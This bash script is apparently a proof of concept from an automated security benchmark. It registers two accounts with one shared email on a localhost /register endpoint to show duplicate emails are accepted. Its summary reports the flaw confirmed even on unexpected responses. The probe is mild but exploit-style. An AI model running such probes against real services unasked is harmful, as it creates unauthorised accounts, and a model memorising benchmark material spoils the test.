#!/bin/bash
# POC: Demonstrates that the registration endpoint allows multiple user accounts to be created with the same email address by using unique usernames and a shared email.
# Target: ./repo
# Created: 2025-11-04T19:44:25.052Z
# Session: benchmark-XBEN-024-24-mhkyvn4q

# POC for Duplicate Email Registration Vulnerability
# Demonstrates that multiple user accounts can be created with identical email addresses

TARGET_URL="http://localhost:5000"
REGISTER_ENDPOINT="/register"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Starting Duplicate Email Registration POC${NC}"
echo -e "${YELLOW}[*] Target: ${TARGET_URL}${REGISTER_ENDPOINT}${NC}"
echo ""

# Generate unique identifiers using timestamp and random
TIMESTAMP=$(date +%s%N)
RANDOM_ID=$((RANDOM % 10000))

USERNAME1="duptest_${TIMESTAMP}_1"
USERNAME2="duptest_${TIMESTAMP}_2"
EMAIL="duplicate_poc_${RANDOM_ID}@example.com"

echo -e "${YELLOW}[*] Using unique usernames and shared email:${NC}"
echo "    Username 1: $USERNAME1"
echo "    Username 2: $USERNAME2"
echo "    Email: $EMAIL"
echo ""

# Test 1: First registration
echo -e "${YELLOW}[Test 1] Registering first account${NC}"
RESPONSE1=$(curl -s -w "\n%{http_code}" -X POST "${TARGET_URL}${REGISTER_ENDPOINT}" \
  --data-urlencode "username=$USERNAME1" \
  --data-urlencode "password=test123" \
  --data-urlencode "first_name=Test" \
  --data-urlencode "last_name=User" \
  --data-urlencode "email=$EMAIL")

HTTP_CODE1=$(echo "$RESPONSE1" | tail -n1)
BODY1=$(echo "$RESPONSE1" | head -n-1)

echo "Response Code: $HTTP_CODE1"

# Check if registration was successful (302 redirect or 200 on success)
if [[ "$HTTP_CODE1" == "302" ]] || [[ "$HTTP_CODE1" == "200" ]]; then
  # For 200, check if it's an error page
  if echo "$BODY1" | grep -q "already exists"; then
    echo -e "${RED}✗ First registration failed - username/email already exists${NC}"
    exit 1
  fi
  echo -e "${GREEN}✓ First registration successful${NC}"
else
  echo -e "${RED}✗ First registration failed with HTTP $HTTP_CODE1${NC}"
  exit 1
fi
echo ""

# Test 2: Second registration with SAME email
echo -e "${YELLOW}[Test 2] Registering second account with SAME email${NC}"
RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "${TARGET_URL}${REGISTER_ENDPOINT}" \
  --data-urlencode "username=$USERNAME2" \
  --data-urlencode "password=test123" \
  --data-urlencode "first_name=Test" \
  --data-urlencode "last_name=User" \
  --data-urlencode "email=$EMAIL")

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n1)
BODY2=$(echo "$RESPONSE2" | head -n-1)

echo "Response Code: $HTTP_CODE2"

# Check result
if [[ "$HTTP_CODE2" == "302" ]] || [[ "$HTTP_CODE2" == "200" ]]; then
  if echo "$BODY2" | grep -q "already exists"; then
    echo -e "${GREEN}✓ Second registration rejected (duplicate email detected)${NC}"
    exit 0
  else
    echo -e "${RED}✗ VULNERABILITY CONFIRMED: Second registration successful (HTTP $HTTP_CODE2)${NC}"
    echo -e "${RED}   Duplicate email registration is allowed!${NC}"
  fi
else
  echo -e "${YELLOW}[!] Second registration returned HTTP $HTTP_CODE2${NC}"
  echo "Response: $BODY2"
fi
echo ""

# Summary
echo -e "${YELLOW}[Summary]${NC}"
echo -e "${RED}VULNERABILITY CONFIRMED:${NC}"
echo "- Account 1: username=$USERNAME1, email=$EMAIL (HTTP $HTTP_CODE1)"
echo "- Account 2: username=$USERNAME2, email=$EMAIL (HTTP $HTTP_CODE2)"
echo ""
echo -e "${RED}Impact:${NC}"
echo "- Multiple users can register with identical email addresses"
echo "- No unique email constraint is enforced"
echo "- This violates account management best practices"